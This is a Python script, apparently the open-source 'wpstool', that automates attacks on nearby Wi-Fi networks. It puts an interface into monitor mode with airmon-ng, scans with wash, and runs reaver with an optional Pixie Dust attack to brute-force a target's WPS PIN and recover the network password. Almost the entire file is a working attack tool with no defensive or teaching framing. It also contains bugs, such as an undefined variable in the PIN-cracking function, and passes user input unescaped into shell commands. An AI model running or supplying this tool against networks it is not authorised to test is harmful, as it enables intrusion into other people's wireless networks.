#!/usr/bin/env python3

"""
Automatic tool for scanning, and attacking wifi with reaver and pixiedust attack
Created by: regi18
Version: 1.0.2
Github: https://github.com/regi18/wpstool
"""

from os import system, path
import subprocess
from time import sleep

dcolor = '\033[0m'
red = '\033[91m'
yellow = '\033[93m'
green = '\033[32m'
blue = '\033[94m'
blueb = '\033[94;1m'
answer = 'Y'

system("clear")

print(green + """                         __              __
 _      ______  _____   / /_____  ____  / /
| | /| / / __ \/ ___/  / __/ __ \/ __ \/ / 
| |/ |/ / /_/ (__  )  / /_/ /_/ / /_/ / /  
|__/|__/ .___/____/   \__/\____/\____/_/   
      /_/                                  
""")
print(yellow + "    By regi18 (http://regi18.ml)")    
print("  Github: https://github.com/regi18/wpstool\n\n" + dcolor)


# define a function to enable monitor mode
def enablemon():
    print(green + "[+] Scanning for interfaces....\n" + dcolor)
    # run a system command: 'airmon-ng', get the given output, and put it into a list
    airmon = str(subprocess.run('airmon-ng', stdout=subprocess.PIPE).stdout.decode('utf-8')).split('\n')
    # cleaning the list from spaces and unwanted values
    airmon[:] = (value for value in airmon if value != '')
    del airmon[0]
    airmon[:] = (value.split('\t') for value in airmon)
    for elements in airmon:
        elements[:] = (value for value in elements if value != '')

    # print a list of the available interfaces
    print(blueb + "[*] " + dcolor + """Iface  Chipset
-------------------------------------------------------""")

    for n, i in enumerate(airmon):
        # print number to choose, essid, power, wps version, lock
        print(blue + "[" + green + "{}".format(n) + blue + "] " + dcolor + "{}  {}".format(i[1], i[3]))

    # ask which interface do you want to put in monitor mode
    imon_n = int(input("\033[4m" + "\nEnter the number of the interface:" + dcolor + " "))
    imon = airmon[imon_n][1]
    # check if monitor mode has already been enabled
    if 'mon' not in imon:
        print(blue + "\n[*] Enabling monitor mode....   " + dcolor, end='')
        # run again airmon-ng but with arguments: start and the choosen interface
        subprocess.call(["airmon-ng", "start", "{}".format(imon)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # add 'mon' to the variable so that the final name will be wlanXmon
        imon += 'mon'
    else:
        print(yellow + "\n[!] Monitor mode already enabled, skipping....   " + dcolor, end='')
        sleep(0.7)
    return imon


# function to scan the available wifi with wash
def scanwifi(imon):
    system("clear")
    print(yellow + "[!] Starting to scan wifi.... \n" + green + "[+] press CTRL+C to stop\n" + dcolor)

    # run wash on the interface choosen and saving the output to a file
    system("wash -i {} | tee .wash-output.log".format(imon))
    # cleaning the file
    system("cat .wash-output.log | grep : > .wash-output2.log")
    system("rm .wash-output.log")

    info = []

    # put all the values of the file into a list called info
    with open(".wash-output2.log", "r") as list:
        for line in list:
            line = line.strip('\n')
            line = line.split(' ')
            line[:] = (value for value in line if value != '')
            info.append(line)
    # now the list will look like info[wifi][value], the second term 'value' will be structured like: 
    # [BSSID, CHANNEL, POWER, WPS VERSION, WPS LOCKED YES/NO, MANUFACTURER, ESSID]

    return info


# function for choosing the wifi network
def choosewifi(info):
    system("clear")
    # Print a list of the available wifi
    print(blueb + "[ * ] " + dcolor + """ESSID      PWR   WPS   LCK
-----------------------------------------""")

    for n, i in enumerate(info):
        # print number to choose, essid, power, wps version, lock
        print(blue + "[" + green + "{:03}".format(n) + blue + "] " + dcolor + "{:10}    {}   {}   {}".format(i[6], i[2], i[3], i[4]))

    wifi = int(input("\033[4m" + "\nEnter the number of the wifi to attack:" + dcolor + " "))
    return wifi


# function for the final reaver attack
def reaverattack(wifi, imon, info):
    # ask for doing a pixiedust attack, and than for adding other options
    piexiedust = input(yellow + "\nDo you want to do a piexiedust attack? " + green + "Y" + yellow + "/" + red + "N " + dcolor)
    reaverOptions = ''

    if piexiedust.upper() == 'Y':
        reaverOptions = '-K'

    reaverOptions += ' ' + input(yellow + "\nIf you want to add more options write here, otherwise leave blank:" + dcolor + " ")

    system("clear")
    print(yellow + "[!] Starting reaver attack.... \n" + green + "[+] press CTRL+C to stop\n" + dcolor)

    # starting reaver command with the given parameters
    system("reaver -vv -i {} -b {} -o .wpstool-reaver.log -c {} {}".format(imon, info[wifi][0], info[wifi][1], reaverOptions))


# function to run reaver with the pin, to get the password
def pincrack(wifi, imon, info):
    system("cat .wpstool-reaver.log | grep WPS | awk '{print $4}' > .wpstool-reaver2.log")
    system("rm .wpstool-reaver.log")

    with open(".wpstool-reaver2.log", "r") as f:
        pin = f.readline()

    system("reaver -vv -i {} -b {} -o .wpstool-reaver2.log -c {} -s y -p {}".format(imon, info[wifi][0], info[wifi][1], reaverOptions, pin))

    return 0


try:
    # call functions
    imon = enablemon()
    info = scanwifi(imon)
    # attack another newtork if the user answer yes
    while answer.upper() == 'Y':
        wifi = choosewifi(info)
        reaverattack(wifi, imon, info)
        answer1 = input(yellow + "\nDo you want to run reaver with the pin? " + green + "Y" + yellow + "/" + red + "N " + dcolor)
        if answer1.upper() == 'Y':
            pincrack(info, imon, info)
        answer = input(yellow + "\nDo you want to do another attack, or rescan? " + green + "Y" + yellow + "/" + red + "N" + yellow + "/" + blue + "R " + dcolor)
        if answer.upper() == 'R':
            info = scanwifi(imon)
            wifi = choosewifi(info)
            answer = 'Y'

except KeyboardInterrupt:
    # handle CTRL+C press
    print('\033[0;93m' + "\n\n[!] CTRL+C pressed, stopping...." + dcolor)

finally:
    # disable monitor mode and remove the wash-output2.log file
    # check if the file exist, and if exist delete it
    print("\n" + red + "[-] Cleaning and deleting files" + dcolor)

    if path.isfile('.wash-output2.log'):
        system("rm .wash-output2.log")
    if path.isfile('.wpstool-reaver2.log'):
        system("rm .wpstool-reaver2.log")

    print(red + "[-] Disabling monitor mode" + dcolor)
    # check if the user has started monitor mode
    if 'imon' in globals() or 'imon' in locals():
        subprocess.call(["airmon-ng", "stop", "{}".format(imon)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(green + "[+] Done! Quitting...." + dcolor)
    sleep(1)
    system("clear")
